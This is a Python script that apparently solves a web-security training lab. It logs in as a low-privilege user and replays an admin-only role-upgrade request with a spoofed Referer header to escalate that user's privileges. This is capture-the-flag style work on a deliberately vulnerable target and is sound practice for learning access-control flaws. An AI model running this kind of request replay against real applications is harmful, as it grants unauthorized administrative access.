import requests

site = "0a8600910404910181943439004200af.web-security-academy.net"
base_url = f"https://{site}"

# Step 1: Login as 'wiener' to get the session cookie
s = requests.Session()
s.post(f"{base_url}/login", data={"username": "wiener", "password": "peter"})

# Step 2: Reuse final POST to /admin-roles copied from admin, but apply wiener session
referer_url = f"{base_url}/admin-roles"
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": referer_url
}

data = {
    "username": "wiener",
    "action": "upgrade",
    "confirmed": "true"
}

# Step 3: Replay the request with proper headers and wiener session
resp = s.post(f"{base_url}/admin-roles", headers=headers, data=data)
print("[*] Replayed final POST using wiener session.")

# Step 4: Visit /admin to trigger solve check
admin_check = s.get(f"{base_url}/admin")
final = s.get(base_url)

if "Congratulations" in final.text:
    print("[✓] Lab solved successfully.")
else:
    print("[!] Attempted replay, but lab still not marked as solved.")
